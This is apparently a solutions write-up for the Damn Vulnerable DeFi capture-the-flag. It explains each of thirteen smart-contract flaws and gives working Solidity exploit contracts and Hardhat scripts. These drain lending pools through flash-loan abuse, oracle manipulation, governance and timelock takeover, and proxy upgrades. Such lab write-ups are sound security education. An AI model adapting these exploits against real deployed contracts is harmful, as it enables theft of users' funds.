# Damn Vulnerable DeFi

## Resources

- [Damn Vulnerable DeFi | CTF - YouTube](https://www.youtube.com/watch?v=A5s9aez43Co&list=PLO5VPQH6OWdXKPThrch6U0imGdD3pHLXi&index=1)
- [Damn Vulnerable DeFi - The rewarder – Dalton Sweeney – Software Engineer obsessed with crypto in general and Ethereum in particular](https://daltyboy11.github.io/damn-vulnerable-defi-rewarder/)
- [Damn Vulnerable DeFi v2](https://ventral.digital/posts/tag/Damn+Vulnerable+DeFi+v2)

## 1. Unstoppable

There is an assertion in the `flashLoan()` function in `UnstoppableLender` contract that uses the variable `poolBalance`. However, this balance variable is updated only when the `depositTokens()` is used. To unable the `flashLoan()` function, the only thing needed to be done is to transfer token directly to the `UnstoppableLender` contract.

Solution:

```javascript
await this.token.transfer(
    this.pool.address, 
    INITIAL_ATTACKER_TOKEN_BALANCE
)
```

## 2. Naive Receiver

The main problems of both contracts are that in the `NaiveReceiverLenderPool` contract, anyone can call the `flashloan()` function and specify a different `borrower` than is not necessarily the caller. Furthermore, the `FlashLoanReceiver` contract does not chech who in the original caller of the `receiveEther()` function.

Solution (contract):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NaiveReceiverExploit {
    address public immutable flashloan;

    constructor(address _flashloan) {
        flashloan = _flashloan;
    }

    function exploit(address _receiver, uint256 _amount) public {
        while (_receiver.balance > 0) {
            (bool success, ) = flashloan.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    _receiver,
                    _amount
                )
            );
            require(success, "Exploit unsuccessful");
        }
    }
}
```

Solution (challenge):

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const NaiveReceiverExploitFactory = await ethers.getContractFactory('NaiveReceiverExploit', deployer);
        this.exploit = await NaiveReceiverExploitFactory.deploy(this.pool.address);
        await this.exploit.exploit(this.receiver.address, 0)
    });
```

## 3. Truster

Since there is no restriction of what `target` address should be and no restriction of what functions can be called within `data`, it is possible to call the `approve()` function from the ERC20 token to approve the exploit contract (or even the attacker address) to transfer any amount of token in behalf of the `TrusterLenderPool` contract.

Solution (contract):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract TrusterExploit {
    function attack(address _pool, address _token) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            2**256 - 1
        );
        pool.flashLoan(0, msg.sender, _token, data);
        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
    }
}
```

Solution (challenge):

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const TrusterExploit = await ethers.getContractFactory('TrusterExploit', deployer);
        const exploit = (await TrusterExploit.deploy()).connect(attacker);
        await exploit.attack(this.pool.address, this.token.address)
    });
```

## 4. Side Entrance

To understand this exploit logic, see the diagram below:

![](C:\Users\eduar\Documents\Cursos\Python\DataFlair\Material\2022-08-08-16-58-41-image.png)

Solition (contract):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceExploit {
    SideEntranceLenderPool immutable pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

Solution (challenge):

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const SideEntranceExploitFactory = await ethers.getContractFactory('SideEntranceExploit', deployer);
        const exploit = (await SideEntranceExploitFactory.deploy(this.pool.address)).connect(attacker);
        await exploit.attack()
    });
```

## 5. The Rewarder

This opens it up to a potential predatory deposit. As soon as there’s a new rewards round we can deposit a very large amount and earn rewards on our deposit. Then we can return the flashloan and keep the rewards. The steps are

1. Take out a flash loan
2. Deposit the flash loan amount in the rewarder pool. This will trigger the rewards distribution.
3. Withdraw the deposit
4. Return the flashloan
5. Send the rewards to the attacker

Solution (contract):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RewarderExploit {
    IERC20 token;
    IERC20 reward;
    FlashLoanerPool pool;
    TheRewarderPool rewardPool;

    constructor(
        address _pool,
        address _token,
        address _rewardPool,
        address _reward
    ) {
        pool = FlashLoanerPool(_pool);
        token = IERC20(_token);
        reward = IERC20(_reward);
        rewardPool = TheRewarderPool(_rewardPool);
    }

    function attack() public {
        pool.flashLoan(token.balanceOf(address(pool)));
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        token.approve(address(rewardPool), _amount);
        rewardPool.deposit(_amount);
        rewardPool.withdraw(_amount);

        token.transfer(address(pool), _amount);
    }
}
```

Solution (challenge):

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const RewarderExploitFactory = await ethers.getContractFactory('RewarderExploit', deployer);
        const deployedContract = await RewarderExploitFactory.deploy(
            this.flashLoanPool.address,
            this.liquidityToken.address,
            this.rewarderPool.address,
            this.rewardToken.address);

        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
        const exploit = deployedContract.connect(attacker)
        await exploit.attack()
    });
```

## 6. Selfie

This attack is separated in two steps:

- Step 1:
  
  - Take out a flash loan of the governance token
  
  - Queue an action to call `drainAllFunds`

- Step 2:
  
  - Wait the amount of days (via `provider.send()`)
  
  - Execute the action

Solution (contract):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    uint256 public actionId;
    address attacker;

    constructor(
        address _pool,
        address _governance,
        address _token,
        address _attacker
    ) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        attacker = _attacker;
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(address _token, uint256 _amount) external {
        token.snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
        );
        actionId = governance.queueAction(address(pool), data, 0);
        IERC20(_token).transfer(address(pool), _amount);
    }
}
```

Solution (challenge):

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const SelfieExploitFactory = await ethers.getContractFactory('SelfieExploit', deployer);
        const deployedContract = await SelfieExploitFactory.deploy(
            this.pool.address,
            this.governance.address,
            this.token.address,
            attacker.address
        );
        const exploit = deployedContract.connect(attacker)
        await exploit.attack()

        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
        const actionId = (await exploit.actionId()).toNumber()
        await this.governance.connect(attacker).executeAction(actionId)
    });
```

## 7. Compromised

The idea is to convert the both retrieved strings into private keys hexstrings. To do that, it is necessary to decode in base64. The two strings are the private keys from 2 trusted reporters addresses: `"0xe92401A4d3af5E446d93D11EEc806b1462b39D15"` and `"0x81A5D6E50C214044bE44cA0CB057fe119097850c"`. With the private keys, wallet accounts can be created and they can be used to set the NFT prices, and with that the exchange balance can be drained.

Solution (challenge):

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const hexString1Raw = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
        const hexString2Raw = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
        const base64String1 = Buffer.from(hexString1Raw.split(' ').join(''), 'hex').toString('utf8')
        const base64String2 = Buffer.from(hexString2Raw.split(' ').join(''), 'hex').toString('utf8')
        const privateKey1 = Buffer.from(base64String1, 'base64').toString('utf8')
        const privateKey2 = Buffer.from(base64String2, 'base64').toString('utf8')

        const wallet1 = new ethers.Wallet(privateKey1, ethers.provider)
        const wallet2 = new ethers.Wallet(privateKey2, ethers.provider)

        await this.oracle.connect(wallet1).postPrice("DVNFT", 0)
        await this.oracle.connect(wallet2).postPrice("DVNFT", 0)

        const tokenId = (await this.exchange.connect(attacker).callStatic.buyOne({ value: 1 })).toNumber()
        // const tokenId = 0
        await this.exchange.connect(attacker).buyOne({ value: 1 })

        const exchangeBalance = await ethers.provider.getBalance(this.exchange.address)

        await this.oracle.connect(wallet1).postPrice("DVNFT", exchangeBalance)
        await this.oracle.connect(wallet2).postPrice("DVNFT", exchangeBalance)

        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId)
        await this.exchange.connect(attacker).sellOne(tokenId)

        await this.oracle.connect(wallet1).postPrice("DVNFT", INITIAL_NFT_PRICE)
        await this.oracle.connect(wallet2).postPrice("DVNFT", INITIAL_NFT_PRICE)
    });
```

## 8. Puppet

The part of the code that allows an exploit is the `_computeOraclePrice()` function.

In reality this solution (multiple transactions) wouldn't be very practical since arbitrage bots would likely pick up on our price manipulation and balance it out for profit before we'd be able to exploit it.

Resources:

- [Exploiting Uniswap: from reentrancy to actual profit - OpenZeppelin blog](https://blog.openzeppelin.com/exploiting-uniswap-from-reentrancy-to-actual-profit/)

- [Uniswap v1 source code](https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy#L202-L222)

Solution (challenge):

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).approve(
            this.uniswapExchange.address,
            ATTACKER_INITIAL_TOKEN_BALANCE
        )
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
            1,
            9999999999
        )
        const collateral = await this.lendingPool.calculateDepositRequired(
            this.token.balanceOf(this.lendingPool.address)
        )
        await this.lendingPool.connect(attacker).borrow(
            this.token.balanceOf(this.lendingPool.address),
            { value: collateral }
        )
    });
```

## 9. Puppet v2

The idea is exactly the same of  the puppet exploit. The only thing need to be done is to adapt the code to Uniswap V2.

Solution (challenge):

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).approve(
            this.uniswapRouter.address,
            ATTACKER_INITIAL_TOKEN_BALANCE
        )
        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            0,
            [this.token.address, this.weth.address],
            attacker.address,
            9999999999
        )
        const collateral = await this.lendingPool.calculateDepositOfWETHRequired(
            POOL_INITIAL_TOKEN_BALANCE
        )
        await this.weth.connect(attacker).deposit({ value: collateral })
        await this.weth.connect(attacker).approve(this.lendingPool.address, collateral)
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
    });
```

## 10. Free Rider

This is a complex exploit. The steps are:

1. Trigger the flash swap
2. Implement the `uniswapV2Call` callback called by Uniswap where we will receive the loan
3. Buy 2 NFTs for 15 ETH each
4. Put them back on sale for 90 ETH each
5. Buy them for only 90 ETH. The other 90 ETH will be drained by the marketplace's onw balance
6. Buy the other 4 NFTs for 60 ETH
7. Send all 6 NFTs to the buyer's contract
8. Transfer the ETH back to Uniswap with fee
9. Transfer the spoils to the attackers EOA

Solution (contract):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IFreeRiderNFTMarketplace {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices)
        external;

    function buyMany(uint256[] calldata tokenIds) external payable;

    function token() external returns (IERC721);
}

interface IWETH {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

interface IERC721 {
    function setApprovalForAll(address operator, bool approved) external;

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
}

interface IERC721TokenReceiver {
    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4);
}

contract FreeRiderExploit is IUniswapV2Callee, IERC721TokenReceiver {
    IUniswapV2Pair immutable uniswapPair;
    IWETH immutable weth;
    IFreeRiderNFTMarketplace immutable nftMarketplace;
    IERC721 immutable nft;
    address immutable attacker;
    address immutable buyer;

    constructor(
        address _uniswapPair,
        address _weth,
        address _nftMarketplace,
        address _nft,
        address _attacker,
        address _buyer
    ) {
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        weth = IWETH(_weth);
        nftMarketplace = IFreeRiderNFTMarketplace(_nftMarketplace);
        nft = IERC721(_nft);
        attacker = _attacker;
        buyer = _buyer;
    }

    // 1 - Trigger flash swap from Uniswap V2
    function attack() external {
        uniswapPair.swap(120 ether, 0, address(this), hex"00");
    }

    // 2 - Uniswap V2 callback after receiving flash swap
    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override {
        weth.withdraw(120 ether);

        // 3 - Buy 2 NFTs for 15 ETH each
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        nftMarketplace.buyMany{value: 30 ether}(tokenIds);

        // 4 - Put them back on sale for 90 ETH each
        nft.setApprovalForAll(address(nftMarketplace), true);
        uint256[] memory prices = new uint256[](2);
        prices[0] = 90 ether;
        prices[1] = 90 ether;
        nftMarketplace.offerMany(tokenIds, prices);

        // 5 - Buy them both but only send 90 ETH, the other 90 will be drained
        // from the market's own balance
        nftMarketplace.buyMany{value: 90 ether}(tokenIds);

        // 7 - Buy remaining 4 NFTs with 60 ETH gained
        tokenIds = new uint256[](4);
        tokenIds[0] = 2;
        tokenIds[1] = 3;
        tokenIds[2] = 4;
        tokenIds[3] = 5;
        nftMarketplace.buyMany{value: 60 ether}(tokenIds);

        // 8 - Send all 6 NFTs to buyer's contract
        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            nft.safeTransferFrom(address(this), buyer, tokenId);
        }

        // 10 - Calculate fee and pay back loan
        uint256 fee = ((120 ether * 3) / uint256(997)) + 1;
        weth.deposit{value: 120 ether + fee}();
        weth.transfer(address(uniswapPair), 120 ether + fee);

        // 11 - Transfer spoils to attacker's EOA
        payable(attacker).transfer(address(this).balance);
    }

    // 6 - The contract will receive 180 ETH as the seller of NFTs, half from itself, other half stolen
    // 9 - The contract receives the 45 ETH reward afte the last NFT is sent to the buyer's contract
    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721TokenReceiver.onERC721Received.selector;
    }
}
```

Solution (challenge):

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const exploit = await (await ethers.getContractFactory('FreeRiderExploit', deployer)).deploy(
            this.uniswapPair.address,
            this.weth.address,
            this.marketplace.address,
            this.nft.address,
            attacker.address,
            this.buyerContract.address
        )
        await exploit.connect(attacker).attack()
    });
```

## 11. Backdoor

The *GnosisSafe* contract does not have a *transfer* function. So if we'd set the token address as fallback-handler and call `transfer()` on the wallet, the wallet should call *transfer* on the token. Since the token contract is being called by the wallet, the `msg.sender` will be the wallet's address and therefore we can freely transfer tokens that belong to the wallet.

Solution (contract):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

interface IGnosisSafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

contract WalletRegistryExploit {
    constructor(
        address registryAddress,
        address masterCopyAddress,
        IGnosisSafeProxyFactory walletFactory,
        IERC20 token,
        address[] memory victims
    ) {
        // Create a wallet for each beneficiary
        for (uint256 i = 0; i < victims.length; i++) {
            address beneficiary = victims[i];
            address[] memory owners = new address[](1);
            owners[0] = beneficiary;

            address wallet = address(
                walletFactory.createProxyWithCallback(
                    masterCopyAddress, // Singleton, the Gnosis master copy
                    abi.encodeWithSelector( // Build initializer bytes array
                        IGnosisSafe.setup.selector, // Function signature to call, must be setup()
                        owners, // Must be exaclty one of the registered beneficiaries
                        1, // Threshold, must be 1
                        address(0), // Optional delegatecall address, don't care
                        0x0, // Optional delegatecall data, don't care
                        address(token), // Sepcify the token as fallback handler
                        address(0), // Payment token, don't care
                        0, // Payment, don't care
                        address(0) // Payment receiver, don't care
                    ),
                    0, // Don't care about the salt or what address the wallet gets from it
                    IProxyCreationCallback(registryAddress) // Registry has the callback to be exploited
                )
            );

            // Wallet should now have received the DVT tokens from the callback

            // We'll act as if the wallet itself is a token,
            // this transfer will be forwarded to the token contract
            IERC20(wallet).transfer(msg.sender, 10 ether);
        }
    }
}
```

Solution (challenge):

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const exploitContract = await ethers.getContractFactory('WalletRegistryExploit', attacker)
        const exploit = await exploitContract.deploy(
            this.walletRegistry.address,
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        )
    });
```

## 12. Climber

To exploit this challenge, the following steps need to be done:

1. Build the proposal for the `ClimberTimelock` contract with the following calls:
   
   1. Call `updateDelay()` and change the delay value to 0
   
   2. Make the exploiter contract as `PROPOSER_ROLE`
   
   3. Call the exploiter contract `scheduleProposal()` function to schedule the proposal
   
   4. Update proxy (OpenZeppelin's `UUPSUpgradeable`) to use this contract as implementation instead
   
   5. Call the `sweepFunds()` function from the exploiter contract to take all funds

2. Implement `scheduleProposal()` function

3. Implement `sweepFunds()`  function

4. Implement `executeProposal()` function

5. **IMPORTANT:** do not forget to implement the `_authorizeUpgrade()` function, required function for inheriting from UUPSUpgradeable

Solution (contract):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract ClimberExploit is UUPSUpgradeable {
    IERC20 immutable token;
    ClimberTimelock immutable timelock;
    ClimberVault immutable vault;
    address immutable attacker;

    constructor(
        address _token,
        address payable _timelock,
        address _vault,
        address _attacker
    ) {
        token = IERC20(_token);
        timelock = ClimberTimelock(_timelock);
        vault = ClimberVault(_vault);
        attacker = _attacker;
    }

    function buildProposal()
        public
        view
        returns (
            address[] memory,
            uint256[] memory,
            bytes[] memory
        )
    {
        address[] memory targets = new address[](5);
        uint256[] memory values = new uint256[](5);
        bytes[] memory dataElements = new bytes[](5);

        // call updateDelay and change the delay value to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector,
            0
        );

        // make this contract as PROPOSER_ROLE
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            timelock.PROPOSER_ROLE(),
            address(this)
        );

        // call this contract to schedule the proposal
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            ClimberExploit.scheduleProposal.selector
        );

        // update proxy to use this contract as implementation instead
        targets[3] = address(vault);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeTo.selector,
            address(this)
        );

        // take all funds
        targets[4] = address(vault);
        values[4] = 0;
        dataElements[4] = abi.encodeWithSelector(
            ClimberExploit.sweepFunds.selector
        );

        return (targets, values, dataElements);
    }

    function executeProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.execute(targets, values, dataElements, 0);
    }

    function scheduleProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.schedule(targets, values, dataElements, 0);
    }

    function sweepFunds() external {
        token.transfer(attacker, token.balanceOf(address(this)));
    }

    // Required function for inheriting from UUPSUpgradeable.
    function _authorizeUpgrade(address newImplementation) internal override {}
}
```

Solution (challenge): 

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const exploitContract = await ethers.getContractFactory('ClimberExploit', deployer)
        const exploit = await exploitContract.deploy(
            this.token.address,
            this.timelock.address,
            this.vault.address,
            attacker.address
        )

        await exploit.connect(attacker).executeProposal()
    });
```

## 13. Safe Miners

This challenge has a lot of guess work. Check this out to understand better: [Damn Vulnerable DeFi V2 - #13 Junior miners • Ventral Digital](https://ventral.digital/posts/2022/7/2/damn-vulnerable-defi-v2-13-junior-miners).

Solution (contract):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SafeMinersExploit {
    constructor(
        address attacker,
        IERC20 token,
        uint256 nonces
    ) {
        for (uint256 idx; idx < nonces; idx++) {
            new TokenSweeper(attacker, token);
        }
    }
}

contract TokenSweeper {
    constructor(address attacker, IERC20 token) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance);
        }
    }
}
```

Solution (challenge):

```javascript
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // Disable timeouts, this is gonna take a while
        this.timeout(0)

        // Try 100 nonces of both EOA accounts
        for (let nonce = 0; nonce < 100; nonce++) {
            await (await ethers.getContractFactory('SafeMinersExploit', deployer))
                .deploy(attacker.address, this.token.address, 100);
            await (await ethers.getContractFactory('SafeMinersExploit', attacker))
                .deploy(attacker.address, this.token.address, 100);
        }
    });
```
